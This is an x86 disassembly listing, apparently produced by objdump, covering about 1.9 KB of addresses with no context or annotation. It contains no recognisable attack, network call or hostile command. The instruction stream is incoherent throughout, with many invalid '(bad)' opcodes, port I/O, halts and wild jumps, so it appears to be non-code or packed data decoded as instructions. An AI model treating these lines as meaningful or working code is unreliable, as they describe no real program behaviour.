  415865:	and    bl,BYTE PTR [esi-0x3b]
  415868:	out    0x46,eax
  41586a:	inc    esp
  41586b:	(bad)  [ecx]
  41586d:	pop    ss
  41586e:	aas    
  41586f:	and    bh,BYTE PTR [edi+0x572a8523]
  415875:	sub    BYTE PTR [eax-0x25],al
  415878:	pushf  
  415879:	mov    edx,0xe5d56fd0
  41587e:	sub    dh,BYTE PTR [edx]
  415880:	adc    al,0x2f
  415882:	mov    esi,0x691d5221
  415887:	arpl   WORD PTR [edi-0x1fb1e4d8],dx
  41588d:	(bad)  
  41588e:	jmp    0x415814
  415890:	sub    ebx,ebp
  415892:	bound  ebx,QWORD PTR [ebx+ecx*1+0x2a]
  415896:	dec    edi
  415897:	push   edi
  415898:	mov    ch,0x84
  41589a:	adc    BYTE PTR [ebp+0x5142f559],bh
  4158a0:	mov    esi,0xf2c80e83
  4158a5:	add    ch,cl
  4158a7:	or     DWORD PTR [ecx-0x7fe59946],0x69
  4158ae:	fisttp DWORD PTR [ecx-0x5a]
  4158b1:	push   ecx
  4158b2:	cmp    eax,DWORD PTR [edi]
  4158b4:	test   eax,0x9f54bd6d
  4158b9:	mov    BYTE PTR [esi+0xa97e960],cl
  4158bf:	rcl    DWORD PTR [eax],cl
  4158c1:	push   es
  4158c2:	push   ss
  4158c3:	mov    eax,ds:0xece31871
  4158c8:	inc    esp
  4158c9:	out    0x89,al
  4158cb:	push   es
  4158cc:	or     ebx,DWORD PTR [ebp-0x3a]
  4158cf:	dec    edx
  4158d0:	ret    0x44e3
  4158d3:	dec    esi
  4158d4:	out    dx,al
  4158d5:	dec    ebx
  4158d6:	(bad)  
  4158d7:	xchg   ebx,eax
  4158d8:	or     BYTE PTR [ebp+edx*8-0x28],dl
  4158dc:	sub    ebx,ebp
  4158de:	lds    ebp,FWORD PTR [esi-0x19]
  4158e1:	fld    DWORD PTR [ebp+0x56ee0332]
  4158e7:	js     0x4158ef
  4158e9:	mov    edx,0x46f49475
  4158ee:	loop   0x415963
  4158f0:	mov    ebp,0xf477301a
  4158f5:	aam    0xb9
  4158f7:	addr16 push edx
  4158f9:	sub    eax,0x32dc2f48
  4158fe:	mov    ah,0x4c
  415900:	jl     0x4158fb
  415902:	jle    0x4158cd
  415904:	dec    esp
  415905:	pusha  
  415906:	pusha  
  415907:	neg    BYTE PTR [ebx+ebx*1-0x1c]
  41590b:	pop    ecx
  41590c:	ds int 0xc4
  41590f:	(bad)  
  415910:	test   ecx,ecx
  415912:	push   edx
  415913:	cs out dx,al
  415915:	add    cl,BYTE PTR [ebx]
  415917:	imul   edi,edi,0x4b
  41591a:	jmp    0x4158af
  41591c:	fisub  WORD PTR ds:0xe13edb12
  415922:	pop    edx
  415923:	dec    eax
  415924:	xor    bh,0x2f
  415927:	pop    ecx
  415928:	push   0xffffffef
  41592a:	sbb    al,0x1f
  41592c:	jae    0x41594d
  41592e:	bound  esi,QWORD PTR [edx+0x74]
  415931:	push   esi
  415932:	call   DWORD PTR [eax]
  415934:	stos   BYTE PTR es:[edi],al
  415935:	ret    0x8748
  415938:	test   al,0x6c
  41593a:	stc    
  41593b:	ror    ah,0x2c
  41593e:	int3   
  41593f:	sub    ah,al
  415941:	adc    ebx,DWORD PTR [ebx*4-0x44ad5461]
  415948:	repz bound ebx,QWORD PTR [ecx+0x4b]
  41594c:	push   ds
  41594d:	mov    dl,0x5f
  41594f:	and    bl,ah
  415951:	out    dx,al
  415952:	shl    DWORD PTR [ecx+0x15ffb12a],0x97
  415959:	inc    ebp
  41595a:	cmp    bh,ah
  41595c:	add    BYTE PTR [ebp+0x16],cl
  41595f:	push   esp
  415960:	aas    
  415961:	scas   al,BYTE PTR es:[edi]
  415962:	int    0xd
  415964:	cmp    cl,BYTE PTR [ecx+0x7f]
  415967:	inc    ebp
  415968:	jo     0x415982
  41596a:	mov    eax,ds:0x1eea7830
  41596f:	fsub   DWORD PTR [esi+0x53]
  415972:	sbb    edx,DWORD PTR [ebx+0x6f]
  415975:	jg     0x41590e
  415977:	(bad)  
  415978:	stc    
  415979:	(bad)  
  41597a:	ficom  DWORD PTR [esi+0x3d]
  41597d:	cmovo  ebp,ecx
  415980:	cmp    ecx,DWORD PTR [ebx-0x27]
  415983:	scas   al,BYTE PTR es:[edi]
  415984:	xor    bl,BYTE PTR [ecx]
  415986:	push   es
  415987:	and    bl,BYTE PTR ds:0x68b1fc7e
  41598d:	xchg   esi,eax
  41598e:	mov    edx,0x88a4ea80
  415993:	push   ebx
  415994:	push   edi
  415995:	cmp    ebx,DWORD PTR [ebx-0x1d]
  415998:	dec    ebx
  415999:	pop    ebx
  41599a:	ins    DWORD PTR es:[edi],dx
  41599b:	mov    bh,0xae
  41599d:	jae    0x415a12
  41599f:	push   esp
  4159a0:	cmp    esp,esi
  4159a2:	push   ds
  4159a3:	std    
  4159a4:	adc    eax,DWORD PTR [edi]
  4159a6:	fstp   TBYTE PTR [ebp+0x41]
  4159a9:	mov    dh,0x1
  4159ab:	hlt    
  4159ac:	dec    eax
  4159ad:	inc    esp
  4159ae:	addr16 push ebp
  4159b0:	out    0xf7,al
  4159b2:	mov    ebp,0xba293d6e
  4159b7:	xor    BYTE PTR [ebp-0x67],0xbd
  4159bb:	pusha  
  4159bc:	push   ds
  4159bd:	int3   
  4159be:	stc    
  4159bf:	push   ss
  4159c0:	ins    BYTE PTR es:[di],dx
  4159c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c3:	jle    0x4159b2
  4159c5:	pop    es
  4159c6:	sbb    ch,BYTE PTR [ecx-0x3e70f07c]
  4159cc:	mov    bh,BYTE PTR [ebp-0x2bf35]
  4159d2:	pop    esp
  4159d3:	stos   BYTE PTR es:[edi],al
  4159d4:	mov    eax,0x7262194
  4159d9:	pop    es
  4159da:	fstp   st(2)
  4159dc:	mov    bh,0x4f
  4159de:	test   BYTE PTR ds:0x5b082815,al
  4159e4:	arpl   WORD PTR ds:0x28a660ad,dx
  4159ea:	or     DWORD PTR [ebx+0x55999d42],ebx
  4159f0:	xor    bh,dh
  4159f2:	stos   DWORD PTR es:[edi],eax
  4159f3:	mov    bh,0x14
  4159f5:	fwait
  4159f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f7:	mov    ebp,0x7d7dd0a8
  4159fc:	call   esi
  4159fe:	stc    
  4159ff:	jmp    0x91509203
  415a04:	std    
  415a05:	repz pop ebp
  415a07:	in     al,dx
  415a08:	nop
  415a09:	mov    WORD PTR [ebx-0x58b2055d],?
  415a0f:	fstp   QWORD PTR [ebp-0x77]
  415a12:	jmp    0x4159db
  415a14:	ror    DWORD PTR [ebp+0x59],cl
  415a17:	push   edx
  415a18:	pushf  
  415a19:	xchg   edx,eax
  415a1a:	cmp    ch,BYTE PTR ds:0xbff4ba09
  415a20:	xchg   edi,eax
  415a21:	popa   
  415a22:	stc    
  415a23:	test   al,dh
  415a25:	push   0xfce23f2f
  415a2a:	mov    dh,0x72
  415a2c:	popf   
  415a2d:	adc    ecx,DWORD PTR [ebx+0x1f]
  415a30:	sub    BYTE PTR [esi+0x75],0x4e
  415a34:	pop    ebp
  415a35:	xor    eax,0x6aabfd62
  415a3a:	dec    edx
  415a3b:	adc    BYTE PTR ss:[ecx-0x46],dh
  415a3f:	sub    ah,BYTE PTR gs:[esi+ecx*4+0x5c]
  415a44:	mov    ecx,0x5942ae51
  415a49:	jne    0x415a31
  415a4b:	xor    bl,BYTE PTR [ebx-0x12]
  415a4e:	push   ecx
  415a4f:	ror    BYTE PTR [edi-0x72],0x13
  415a53:	xchg   esi,eax
  415a54:	ficomp DWORD PTR [ebp+0x5c6233d3]
  415a5a:	xchg   edi,eax
  415a5b:	ins    DWORD PTR es:[edi],dx
  415a5c:	push   ebp
  415a5d:	retf   0xf5c0
  415a60:	pop    esp
  415a61:	lea    ebp,[ecx]
  415a63:	sbb    cl,BYTE PTR [ebx+0x2a99e7a7]
  415a69:	sub    dh,BYTE PTR [eax-0x4]
  415a6c:	loop   0x415aa9
  415a6e:	je     0x415ace
  415a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a71:	js     0x415a67
  415a73:	pop    edx
  415a74:	dec    ecx
  415a75:	sub    eax,0xb2a408b0
  415a7a:	mov    bl,BYTE PTR [eax]
  415a7c:	call   0xaabb1232
  415a81:	out    dx,al
  415a82:	(bad)  
  415a83:	xor    al,0x20
  415a85:	icebp  
  415a86:	pop    esp
  415a87:	ret    
  415a88:	cdq    
  415a89:	mov    bl,0x33
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	rcl    BYTE PTR [edi-0x50],0xd4
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415ac5
  415ab1:	(bad)  
  415ab2:	pop    edx
  415ab3:	mov    edx,edx
  415ab5:	mov    cl,0xc4
  415ab7:	jg     0x415abe
  415ab9:	outs   dx,DWORD PTR ds:[esi]
  415aba:	jmp    0x89b3:0x78952672
  415ac1:	jb     0x415ac6
  415ac3:	mov    bh,BYTE PTR [edi]
  415ac5:	lods   al,BYTE PTR ds:[esi]
  415ac6:	fidivr WORD PTR [edi+0x7b]
  415ac9:	or     DWORD PTR [esi-0x67220cb1],ebp
  415acf:	inc    eax
  415ad1:	jo     0x415aaf
  415ad3:	mov    esp,0xa942657d
  415ad8:	add    esi,DWORD PTR [edx+0x5a]
  415adb:	lahf   
  415adc:	popf   
  415add:	push   ebp
  415ade:	push   eax
  415adf:	(bad)  
  415ae1:	inc    eax
  415ae2:	cmp    DWORD PTR [eax],edi
  415ae4:	repz (bad) 
  415ae6:	or     BYTE PTR [edi+0x59],bh
  415ae9:	mov    ds:0xa82ffe0f,eax
  415aee:	lods   eax,DWORD PTR ds:[esi]
  415aef:	jl     0x415a75
  415af1:	inc    edi
  415af2:	ss jne 0x415a7b
  415af5:	cdq    
  415af6:	or     cl,al
  415af8:	js     0x415b76
  415afa:	aaa    
  415afb:	xchg   edx,eax
  415afc:	sbb    bh,cl
  415afe:	(bad)
  415b02:	or     BYTE PTR [edx-0xb],ch
  415b05:	mov    ah,0xc
  415b07:	int3   
  415b08:	jne    0x415b48
  415b0a:	xchg   esp,eax
  415b0b:	push   ss
  415b0c:	sub    DWORD PTR ds:0x2802ff05,ebp
  415b12:	cld    
  415b13:	push   0xffffff80
  415b15:	cmp    eax,0xa84bee6
  415b1a:	aaa    
  415b1b:	push   ebp
  415b1c:	retf   0x5b43
  415b1f:	jmp    0x415b1f
  415b21:	call   0x40c2:0xd0ff08e4
  415b28:	sahf   
  415b29:	int3   
  415b2a:	sti    
  415b2b:	lahf   
  415b2c:	jne    0x415acb
  415b2e:	lock and ah,cl
  415b31:	inc    eax
  415b32:	stos   DWORD PTR es:[edi],eax
  415b33:	jp     0x415b9f
  415b35:	cmp    DWORD PTR [eax-0x64],ebp
  415b38:	outs   dx,DWORD PTR ds:[esi]
  415b39:	fs jb  0x415b4d
  415b3c:	and    bl,dh
  415b3e:	int    0xf1
  415b40:	loop   0x415b62
  415b42:	jecxz  0x415ba6
  415b44:	shl    DWORD PTR [ecx+0x770bb13],cl
  415b4a:	jle    0x415ad3
  415b4c:	sbb    edi,esi
  415b4e:	lods   al,BYTE PTR ds:[esi]
  415b4f:	jbe    0x415ae5
  415b51:	xor    eax,0x89a8525f
  415b56:	add    DWORD PTR [edx-0x1a],esp
  415b59:	jmp    0xf1c8:0x26ddc435
  415b60:	xor    al,0x9e
  415b62:	cmp    al,0xc1
  415b64:	pop    eax
  415b65:	jb     0x415b2f
  415b67:	ins    DWORD PTR es:[edi],dx
  415b68:	aaa    
  415b69:	or     al,0xb8
  415b6b:	mov    ebx,0xbfdda9b3
  415b70:	xor    al,0x84
  415b72:	inc    edi
  415b73:	retf   
  415b74:	std    
  415b75:	in     eax,dx
  415b76:	aas    
  415b77:	mov    cs,edi
  415b79:	ror    BYTE PTR [edi],0xd6
  415b7c:	rol    BYTE PTR ds:0x41df1ba1,cl
  415b82:	xor    al,0xd8
  415b84:	pop    edx
  415b85:	jns    0x415b09
  415b87:	(bad)  
  415b88:	mov    ds:0x7d9e85d3,al
  415b8d:	jae    0x415b81
  415b8f:	idiv   BYTE PTR [ebp+edi*1-0x3a]
  415b93:	cs pop ds
  415b95:	mov    eax,ds:0x18d1a4c0
  415b9a:	lods   al,BYTE PTR ds:[esi]
  415b9b:	clc    
  415b9c:	pop    esp
  415b9d:	push   ebp
  415b9e:	(bad)  
  415b9f:	push   ds
  415ba0:	xchg   esi,eax
  415ba1:	js     0x415c1d
  415ba3:	aas    
  415ba4:	sub    edx,DWORD PTR [edx+edx*1+0x2f]
  415ba8:	cwde   
  415ba9:	(bad)  
  415baa:	ins    DWORD PTR es:[edi],dx
  415bab:	xor    al,0x3b
  415bad:	fidivr DWORD PTR [eax]
  415baf:	imul   si,WORD PTR [eax],0x25
  415bb3:	popa   
  415bb4:	xchg   ebp,eax
  415bb5:	add    DWORD PTR [ecx+0x14],0x8caa93a9
  415bbc:	and    eax,0xe2b31978
  415bc1:	mov    cl,0x78
  415bc3:	repnz fwait
  415bc5:	and    al,0x1f
  415bc7:	jge    0x415c0a
  415bc9:	or     al,0xbe
  415bcb:	xchg   ebx,eax
  415bcc:	fimul  WORD PTR [ecx]
  415bce:	cmp    al,0x67
  415bd0:	push   ebp
  415bd1:	sub    dl,cl
  415bd3:	arpl   WORD PTR [edx],dx
  415bd5:	es jl  0x415b79
  415bd8:	icebp  
  415bd9:	iret   
  415bda:	stc    
  415bdb:	sbb    al,0xd9
  415bdd:	fdiv   st,st(1)
  415bdf:	mov    BYTE PTR [ebx-0x68],al
  415be2:	cmp    BYTE PTR [esi-0x2d919c63],0x5
  415be9:	fild   DWORD PTR [ebp+0x3afaae76]
  415bef:	ja     0x415c04
  415bf1:	(bad)  
  415bf2:	outs   dx,BYTE PTR ds:[esi]
  415bf3:	jp     0x415c51
  415bf5:	loopne 0x415c3d
  415bf7:	xor    edx,DWORD PTR [esi-0x77827242]
  415bfd:	(bad)  
  415bfe:	sbb    edi,ebx
  415c00:	add    dl,bh
  415c02:	iret   
  415c03:	dec    esi
  415c04:	sahf   
  415c05:	fstp   QWORD PTR [edx]
  415c07:	aam    0xb
  415c09:	mov    ds:0x2bbc439d,eax
  415c0e:	rcr    BYTE PTR ds:0xd7a08e1b,1
  415c14:	jno    0x415bf1
  415c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c17:	xchg   ecx,eax
  415c18:	ja     0x415bbc
  415c1a:	add    edx,DWORD PTR ds:0x6ce42f5
  415c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c21:	les    ebx,FWORD PTR gs:[ebx]
  415c24:	aad    0xa1
  415c26:	sar    cl,0x95
  415c29:	mov    ds:0x21a4bba8,al
  415c2e:	or     eax,0x697a97b3
  415c33:	or     DWORD PTR [ecx-0x46],esp
  415c36:	xchg   ebx,eax
  415c37:	and    BYTE PTR [ecx+esi*4-0x70],dh
  415c3b:	add    BYTE PTR [eax-0x70b5e5f6],dh
  415c41:	push   ss
  415c42:	and    al,0x93
  415c44:	and    DWORD PTR [ebx],ebp
  415c46:	dec    ecx
  415c47:	push   ds
  415c48:	push   esi
  415c49:	pop    esp
  415c4a:	clc    
  415c4b:	hlt    
  415c4c:	cmp    DWORD PTR [esi+0x2a],ecx
  415c4f:	jo     0x415c0e
  415c51:	scas   al,BYTE PTR es:[edi]
  415c52:	jg     0x415c1e
  415c54:	sbb    esp,DWORD PTR [eax+esi*1]
  415c57:	inc    ebx
  415c58:	jp     0x415c2e
  415c5a:	out    0x59,al
  415c5c:	pop    ecx
  415c5d:	clc    
  415c5e:	mov    ebp,ecx
  415c60:	sahf   
  415c61:	out    0x5,eax
  415c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c64:	jb     0x415cad
  415c66:	or     DWORD PTR [ebx],edx
  415c68:	call   DWORD PTR [esi+0x299da941]
  415c6e:	mov    ds:0x81fd1891,eax
  415c73:	xor    al,0x88
  415c75:	shr    BYTE PTR [ebx],cl
  415c77:	and    BYTE PTR [ecx-0x700af5ad],0xe0
  415c7e:	inc    esi
  415c7f:	ror    eax,1
  415c81:	adc    dl,dh
  415c83:	add    al,0xa0
  415c85:	sbb    ch,BYTE PTR [ebx]
  415c87:	push   edx
  415c88:	push   edx
  415c89:	test   al,0x8d
  415c8b:	mov    ebx,0xe7bd92b3
  415c90:	mov    ecx,DWORD PTR [eax]
  415c92:	leave  
  415c93:	popf   
  415c94:	je     0x415cf2
  415c96:	jmp    FWORD PTR [ebx+esi*8+0x6e]
  415c9a:	clc    
  415c9b:	push   cs
  415c9c:	imul   ebx,DWORD PTR [eax+0x18],0xffffffb1
  415ca0:	or     eax,0x443185a7
  415ca5:	push   esp
  415ca6:	aad    0xe0
  415ca8:	cmp    al,0x1e
  415caa:	push   edx
  415cab:	or     al,0x1d
  415cad:	pusha  
  415cae:	loopne 0x415d19
  415cb0:	gs xor al,0x5
  415cb3:	mov    ah,0xfc
  415cb5:	xchg   edx,eax
  415cb6:	lods   eax,DWORD PTR ds:[esi]
  415cb7:	lods   eax,DWORD PTR ds:[esi]
  415cb8:	es push cs
  415cba:	in     al,dx
  415cbb:	fsub   st(2),st
  415cbd:	icebp  
  415cbe:	div    DWORD PTR es:[ecx-0x36f063a]
  415cc5:	in     al,dx
  415cc6:	neg    esi
  415cc8:	and    eax,0xb499eca3
  415ccd:	jmp    DWORD PTR [ebp-0x44]
  415cd0:	cmp    BYTE PTR [eax],dl
  415cd2:	mov    al,0xf3
  415cd4:	gs mov ebp,0xe40a96f6
  415cda:	rcl    edi,cl
  415cdc:	dec    esi
  415cdd:	pop    es
  415cde:	pushf  
  415cdf:	cmp    ebp,ecx
  415ce1:	repnz cmc 
  415ce3:	pop    es
  415ce4:	push   ebp
  415ce5:	aas    
  415ce6:	enter  0x6731,0x68
  415cea:	mov    BYTE PTR [eax-0x4a2dcbeb],dh
  415cf0:	and    DWORD PTR [edi],ecx
  415cf2:	or     al,0x1d
  415cf4:	xor    eax,ebp
  415cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf7:	sti    
  415cf8:	test   eax,0x8b87b8aa
  415cfd:	int3   
  415cfe:	push   esp
  415cff:	sub    BYTE PTR [edi-0x13e3768d],bh
  415d05:	aad    0xa9
  415d07:	inc    edx
  415d08:	mov    dl,0x6e
  415d0a:	popf   
  415d0b:	pop    ebp
  415d0c:	xchg   BYTE PTR [ebp-0x7b],dl
  415d0f:	jne    0x415cac
  415d11:	cmp    eax,0xf56e1c31
  415d16:	mov    cl,0xc4
  415d18:	add    dl,0x89
  415d1b:	pop    ebx
  415d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d1d:	(bad)  
  415d1e:	or     esp,DWORD PTR [ecx+edx*8+0x62eb6945]
  415d25:	in     eax,0xc8
  415d27:	pop    ebx
  415d28:	or     BYTE PTR [edx],ch
  415d2a:	test   al,0x29
  415d2c:	rcr    BYTE PTR [edx],0xb2
  415d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d30:	or     DWORD PTR [ebx],esp
  415d32:	shr    esp,cl
  415d34:	add    eax,0xec30b243
  415d39:	fld    st(7)
  415d3b:	cli    
  415d3c:	push   ebx
  415d3d:	loopne 0x415d12
  415d3f:	pushf  
  415d40:	mov    ch,0xb3
  415d42:	xchg   ebp,eax
  415d43:	pusha  
  415d44:	xor    ch,0x9a
  415d47:	mov    edx,0x535b216c
  415d4c:	sub    ah,BYTE PTR [di+0x3bcc]
  415d51:	mov    ebx,DWORD PTR [edi-0x14]
  415d54:	push   ecx
  415d55:	xchg   ecx,eax
  415d56:	stc    
  415d57:	jbe    0x415d10
  415d59:	adc    al,0x82
  415d5b:	inc    ebp
  415d5c:	cmp    dl,BYTE PTR [eax]
  415d5e:	mov    ds:0x5f5fde49,al
  415d63:	scas   al,BYTE PTR es:[edi]
  415d64:	out    dx,al
  415d65:	nop
  415d66:	sbb    ecx,DWORD PTR [esi]
  415d68:	xor    BYTE PTR [edx],al
  415d6a:	pop    edx
  415d6b:	test   DWORD PTR [edi-0x45d16eb2],0xcaef84d2
  415d75:	fild   QWORD PTR [ebp-0x74f7aa75]
  415d7b:	jge    0x415d59
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	mov    edi,ecx
  415d96:	ss icebp 
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	pop    eax
  415da1:	push   eax
  415da2:	scas   al,BYTE PTR es:[edi]
  415da3:	or     al,BYTE PTR [ebp+ebp*2-0x53]
  415da7:	and    DWORD PTR [eax-0x935a4c5],0xffffff8a
  415dae:	push   edx
  415daf:	mov    gs,WORD PTR [eax]
  415db1:	call   0xb210130c
  415db6:	lahf   
  415db7:	pop    ss
  415db8:	mov    ah,0x74
  415dbb:	and    BYTE PTR [eax-0x4c],cl
  415dbe:	mov    eax,0x389160c2
  415dc3:	mov    ebx,0x7224d485
  415dc8:	cli    
  415dc9:	jne    0x415dd9
  415dcb:	adc    edx,DWORD PTR [ebp-0xb327d7d]
  415dd1:	fidivr DWORD PTR [edx]
  415dd3:	add    eax,0xb3973821
  415dd8:	sahf   
  415dd9:	xor    al,BYTE PTR ds:0x1a07e338
  415ddf:	and    DWORD PTR [ebx],esi
  415de1:	or     BYTE PTR [ebx+0x44adf404],cl
  415de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de8:	into   
  415de9:	inc    ecx
  415dea:	test   BYTE PTR [ebp+0x7cdf7475],0xb3
  415df1:	ret    
  415df2:	jne    0x415da6
  415df4:	ja     0x415e61
  415df6:	jno    0x415e5a
  415df8:	jg     0x415d9c
  415dfa:	bound  esi,QWORD PTR [edx+edi*1+0x1]
  415dfe:	aas    
  415dff:	int    0xa
  415e01:	jno    0x415e5e
  415e03:	popf   
  415e04:	sbb    ebp,DWORD PTR [ebp+0x1883ed29]
  415e0a:	xchg   BYTE PTR [edi+0x68],cl
  415e0d:	mov    eax,0x788c1aac
  415e12:	jne    0x415e85
  415e14:	sub    eax,0xbfe0d6c
  415e19:	retf   0x913b
  415e1c:	fst    QWORD PTR [ebx+0x4561835c]
  415e22:	mov    ch,0xfe
  415e24:	push   ebx
  415e25:	xchg   ebp,eax
  415e26:	dec    ebx
  415e27:	mov    dl,0xc5
  415e29:	arpl   WORD PTR [eax+0x11],si
  415e2c:	adc    al,dl
  415e2e:	test   al,0x9b
  415e30:	or     ebx,edi
  415e32:	out    0x3e,eax
  415e34:	pop    ecx
  415e35:	push   ebx
  415e36:	sbb    al,0x26
  415e38:	mov    eax,DWORD PTR [esi-0x438a5a64]
  415e3e:	jnp    0x415e93
  415e40:	or     ebx,DWORD PTR [ebp-0x1e]
  415e43:	sub    BYTE PTR [eax-0x30],0x69
  415e47:	shl    DWORD PTR [ebp-0x4d6755c4],cl
  415e4d:	xor    BYTE PTR [esp+ebx*2+0x35],0x58
  415e52:	lds    edx,FWORD PTR [esi+0x6172ad5]
  415e58:	or     DWORD PTR ds:0x69bd43f9,edx
  415e5e:	push   DWORD PTR [esi]
  415e60:	push   esp
  415e61:	popf   
  415e62:	fcom   QWORD PTR [eax]
  415e64:	add    ah,BYTE PTR [eax]
  415e66:	ss mov al,0x16
  415e69:	icebp  
  415e6a:	sub    eax,0x6c84cab
  415e6f:	stc    
  415e70:	mov    ds:0x92385810,al
  415e75:	jae    0x415e2b
  415e77:	xchg   ecx,eax
  415e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e79:	xchg   ebx,eax
  415e7a:	addr16 ret 
  415e7c:	lods   al,BYTE PTR ds:[esi]
  415e7d:	nop
  415e7e:	xchg   ecx,eax
  415e7f:	fwait
  415e80:	push   ecx
  415e81:	out    dx,al
  415e82:	mov    esi,0xb837f9ab
  415e87:	fadd   QWORD PTR [edi-0x3b]
  415e8a:	pop    ebp
  415e8b:	mov    al,0x63
  415e8d:	sbb    cl,bh
  415e8f:	or     al,0x9d
  415e91:	mov    ah,0x9
  415e93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e95:	and    BYTE PTR [ebx+0x55],bl
  415e98:	not    BYTE PTR [esi+0x5a79c6fe]
  415e9e:	mov    esi,0x89ddf5b6
  415ea3:	in     eax,0x3b
  415ea5:	jle    0x415e3f
  415ea7:	mov    eax,0x83092d20
  415eac:	mov    ah,0xa2
  415eae:	mov    esp,0xf90f7f15
  415eb3:	push   esi
  415eb4:	inc    eax
  415eb5:	mov    ds:0x8ae52a23,al
  415eba:	sub    eax,0x72cafdd
  415ebf:	cmp    DWORD PTR [esp+edi*2-0x70d6905f],ebx
  415ec6:	loope  0x415f37
  415ec8:	pop    ebp
  415ec9:	mov    DWORD PTR [edx-0x4d],ebx
  415ecc:	js     0x415f38
  415ece:	cmp    BYTE PTR [eax],0x4b
  415ed1:	pop    ds
  415ed2:	cld    
  415ed3:	push   ecx
  415ed4:	jb     0x415f1b
  415ed6:	test   al,0x2b
  415ed8:	test   al,0x3a
  415eda:	(bad)  
  415edb:	aam    0x79
  415edd:	enter  0x858a,0x8b
  415ee1:	shr    DWORD PTR [edi+0x4],cl
  415ee4:	mov    al,ds:0x99ca09f8
  415ee9:	popa   
  415eea:	add    DWORD PTR [ebp-0x1a],0x0
  415eee:	leave  
  415eef:	cmp    eax,0xa67e8197
  415ef4:	add    DWORD PTR [ebp+0x62a997ac],ebx
  415efa:	cmp    DWORD PTR [ecx-0x6dd20677],edi
  415f00:	dec    ebp
  415f01:	out    0xf1,eax
  415f03:	push   ss
  415f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f05:	push   esi
  415f06:	(bad)  
  415f08:	ss ja  0x415f22
  415f0b:	xor    eax,0x741920df
  415f10:	cld    
  415f11:	jl     0x415f74
  415f13:	aaa    
  415f14:	push   ds
  415f15:	mov    ax,ds:0x1f5c2d5a
  415f1b:	mov    bh,0xe5
  415f1d:	inc    esi
  415f1e:	pop    ebx
  415f1f:	sub    BYTE PTR [bx+si+0x30],dh
  415f23:	nop
  415f24:	stc    
  415f25:	inc    ecx
  415f26:	jbe    0x415f77
  415f28:	push   ecx
  415f29:	daa    
  415f2a:	(bad)  
  415f2b:	clc    
  415f2c:	jno    0x415f4a
  415f2e:	mov    eax,ds:0x3a6f61b7
  415f33:	xchg   ebp,eax
  415f34:	arpl   WORD PTR [esi-0x54],sp
  415f37:	paddw  mm7,QWORD PTR [esi-0x77c56d80]
  415f3e:	push   esi
  415f3f:	fs ret 
  415f41:	dec    ebx
  415f42:	push   esi
  415f43:	jmp    FWORD PTR [edi-0x4f]
  415f46:	loop   0x415f74
  415f48:	mov    ?,WORD PTR [ebx-0x505ee966]
  415f4e:	retf   0x8e64
  415f51:	out    dx,eax
  415f52:	in     al,0xe5
  415f54:	fcmovb st,st(0)
  415f56:	xor    BYTE PTR [ebx+0x5d],bl
  415f59:	jne    0x415fa5
  415f5b:	xor    dh,bl
  415f5d:	fstp   DWORD PTR [ebx-0x6c]
  415f60:	push   esi
  415f61:	jg     0x415f4f
  415f63:	jmp    0x2e7a9a9c
  415f68:	pusha  
  415f69:	test   al,0xa0
  415f6b:	dec    esp
  415f6c:	inc    esp
  415f6d:	add    al,bh
  415f6f:	clc    
  415f70:	shl    al,0x3d
  415f73:	cmc    
  415f74:	lahf   
  415f75:	sbb    DWORD PTR [ecx-0x18],0x3e6e80db
  415f7c:	add    BYTE PTR [eax+0x20],0xd6
  415f80:	retf   
  415f81:	pop    ebx
  415f82:	in     al,0x2d
  415f84:	jne    0x415ff0
  415f86:	xor    BYTE PTR [edx+0x7f3c8f4],cl
  415f8c:	sahf   
  415f8d:	in     eax,0xf6
  415f8f:	adc    esi,DWORD PTR [ecx+0xaf77f05]
  415f95:	fnsave [ecx-0x21b6c0a9]
  415f9b:	loope  0x415f58
  415f9d:	sub    cl,BYTE PTR ss:[edx+0x6d]
  415fa1:	(bad)  
  415fa2:	imul   BYTE PTR [edi]
  415fa4:	outs   dx,DWORD PTR ds:[esi]
  415fa5:	or     al,0x83
  415fa7:	shl    bh,0x18
  415faa:	repz cwde 
  415fac:	xor    bl,BYTE PTR [edx]
  415fae:	dec    eax
  415faf:	sbb    esi,DWORD PTR [eax+0x2]
  415fb2:	jge    0x415f82
  415fb4:	ja     0x415fbf
  415fb6:	ror    DWORD PTR [edx+0x19a047de],1
  415fbc:	sbb    esi,edi
  415fbe:	xor    eax,0xfc860960
  415fc3:	popf   
  415fc4:	in     eax,dx
  415fc5:	jp     0x415fce
  415fc7:	xor    BYTE PTR [edi+0x6d],0xc4
  415fcb:	jne    0x415fde
  415fcd:	sub    eax,0x6b72530e
  415fd2:	sbb    eax,0xc5bde34d
  415fd7:	inc    ecx
  415fd8:	push   0x5de6255c
  415fdd:	push   esi
  415fde:	ss enter 0x419f,0x3b
  415fe3:	mov    dl,0xb1
  415fe5:	enter  0xac0b,0xb1
  415fe9:	push   ss
  415fea:	push   cs
  415feb:	cvtps2pd xmm6,QWORD PTR [edi+esi*8-0x1c]
